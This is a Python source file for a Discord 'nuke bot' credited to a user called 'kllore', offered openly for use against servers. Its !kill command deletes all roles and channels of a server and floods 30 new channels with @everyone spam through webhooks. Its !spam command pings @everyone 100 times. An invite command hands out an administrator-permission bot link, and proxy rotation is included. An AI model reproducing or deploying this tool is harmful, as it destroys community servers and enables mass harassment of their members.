from colorama.initialise import init
import discord
from discord import Intents
from discord.ext import commands, tasks
from colorama import Fore, Style
import json
import time
import random
import asyncio
from asyncio import create_task
import requests
from datetime import datetime

################ discord creator nick: kllore. ################
################ discord creator id: 1204119391021695018 ################

################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################

protected_servers = [123, 456]
nuke_command_message = '@everyone @here YOUR TEXT'
spam_command_message = '@everyone @here YOUR TEXT'
selected_proxy = ""
proxies = []
server_id = '123'
status_id = 123
boost_role_id = 123
TOKEN = "TOKEN"


init()

intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents)
client.remove_command('help')

################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################



@client.event
async def on_ready():
    print(f'Bot online: {client.user}')

    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="at your mother"), status=discord.Status.idle)


################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################



@client.command()
async def help(ctx):
    await ctx.message.delete()
    await ctx.send("\nCommands:\n!kill - destroy the server\n!spam [channel] - Spams `@everyone` ping 100 times\n!members - Displays member count\n")


################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################


async def killobject(obj):
    try: await obj.delete()
    except: pass

async def sendch(ctx,channel: discord.TextChannel,count):
    for _ in range(count):
        try: await channel.send(nuke_command_message)
        except: pass

async def createchannel(ctx,name):
    try:
        chan = await ctx.guild.create_text_channel(name=name)
        wb = await chan.create_webhook(name="kllore. ontop")
        create_task(sendch(ctx,wb,40))
    except: pass






@client.command()
async def kill(ctx):
    guild = ctx.guild
    
    if guild.id in protected_servers:
        await ctx.reply("Protected servers.")
        return
    
    await ctx.message.delete()
    
    for rl in ctx.guild.roles:
        create_task(killobject(obj=rl))
    
    for channel in ctx.guild.channels:
        create_task(killobject(obj=channel))
    
    for _ in range(30):    
        create_task(createchannel(ctx, name="kllore on top"))


    await asyncio.sleep(6)
    
    invite = ""
    try:
        invite = await random.choice(guild.text_channels).create_invite()
    except:
        pass





################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################



@client.command()
async def spam(ctx, channel: discord.TextChannel = None):
    guild = ctx.guild
    
    if guild.id in protected_servers:
        await ctx.reply("Protected servers.")
        return
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    for i in range(100):
        await channel.send(spam_command_message)

################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################


@client.command()
async def members(ctx):
    await ctx.message.delete()
    await ctx.send(f"member amount: {ctx.guild.member_count}")


################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################


@client.command()
async def invite(ctx):
    if ctx.guild and ctx.guild.id == server_id:

        embed_channel = discord.Embed(
            title="CHECK YOUR DM",
            description="Check your DMs, if you don't receive anything activate the DMs",
            color=discord.Color.green()
        )
        

        await ctx.send(embed=embed_channel)
        

        embed_dm = discord.Embed(
            title="NUKE BOT",
            description="To use the nuke bot you need to use this link:",
            color=discord.Color.blue()
        )
        

        embed_dm.add_field(name="invite link", value="https://discord.com/api/oauth2/authorize?client_id=1152319789243580526&permissions=8&scope=bot")
        embed_dm.add_field(name="commands:", value="!kill, !spam")
        

        await ctx.author.send(embed=embed_dm)
    else:
        await ctx.send("This command is reserved.")
        
        
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################


try:
    with open('proxies.json', 'r') as f:
        proxies = json.load(f)
except FileNotFoundError:
    pass

@tasks.loop(hours=1)
async def change_proxy():
    global selected_proxy
    if proxies:
        selected_proxy = random.choice(proxies)
    else:
        selected_proxy = ""

@tasks.loop(hours=1)
async def send_status():
    global selected_proxy, uptime 
    channel = client.get_channel(status_id)
    
    if channel:
        uptime += 1 
        status_message = (
            f'Status: Online\n'
            f'Ping: {round(client.latency * 1000)}ms\n'
            f'Proxy: {selected_proxy}'
        )
        await channel.send(status_message)

@client.command()
async def start(ctx):
    change_proxy.start()
    send_status.start()
    await ctx.send('Bot started!')

@client.command()
async def proxy(ctx, *new_proxies):
    added_proxies = []

    for new_proxy in new_proxies:
        new_proxy = new_proxy.strip()
        if new_proxy:
            proxies.append(new_proxy)
            added_proxies.append(new_proxy)

    if added_proxies:
        with open('proxies.json', 'w') as f:
            json.dump(proxies, f)
        
        added_proxies_str = "\n".join(added_proxies)
        await ctx.send(f'Proxy added: \n{added_proxies_str}')
    else:
        await ctx.send('No valid proxy provided.')


uptime = 0

################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################



@client.event
async def on_member_boost(member):
    boost_channel = member.guild.get_channel(boost_role_id)

    if boost_channel is None:
        boost_channel = member.guild.system_channel

    avatar_url = member.avatar.url if member.avatar else member.default_avatar.url

    embed = discord.Embed(
        title=f"Thank you {member.display_name} for your boost!",
        description=f"Your support is greatly appreciated!",
        color=discord.Color.gold()
    )
    embed.set_thumbnail(url=avatar_url)

    if boost_channel is not None:
        await boost_channel.send(embed=embed)
        
        
        

    

client.run(TOKEN)


################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
################ KLLORE ON TOP ################
